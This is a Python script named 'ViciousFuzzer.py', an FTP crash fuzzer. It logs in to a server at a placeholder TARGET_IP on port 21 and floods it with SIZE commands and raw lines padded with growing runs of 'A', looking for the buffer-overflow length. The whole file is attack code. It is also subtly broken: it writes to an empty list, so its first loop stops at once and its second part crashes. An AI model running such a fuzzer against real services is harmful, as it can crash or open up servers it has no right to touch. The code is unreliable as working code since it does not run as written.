##############################################
#               ViciousFuzzer.py             #
#                   by AFANX                 #
##############################################

import socket
import random
import time

def mutagen(testCase, n):
    d = random.randint(1, n+1)
    count = len(testCase) + (n-1)*d
    for i in range(count):
        testCase += "A"
    return testCase

n = 0
rangeFuzz = []
junk = "A"

sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
connect = sock.connect(('TARGET_IP',21))
sock.recv(1024)
sock.send(b'USER noname\r\n')
sock.recv(1024)
sock.send(b'PASS noname\r\n')

# PART 1

print("############## PART I ##############")
while(1):        
    try:
        rangeFuzz[0] = len(junk)
        junk = mutagen(junk, n)
        rangeFuzz[1] = len(junk)
        sock.recv(1024)
        sock.send(b'SIZE' + junk.encode() + b'\r\n')
        print("[+] len: ", len(junk))
        print("[+] junk: ", junk)
        n+=1
    except:
        sock.close()
        break

# PART 2

print("############## PART II ##############")
time.sleep(5)
sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
connect = sock.connect(('TARGET_IP',21))

for i in range(rangeFuzz[0],rangeFuzz[1]):
    try:
        junk = "A" * i
        sock.recv(1024)
        sock.send(junk.encode() + b'\r\n')
        print("[+] len: ", len(junk))
        print("[+] junk: ", junk)
    except:
        sock.close()
        break

print("\n\n\n#############################")
print("len: ",len(junk))
print("junk: ", junk)
print("#############################")

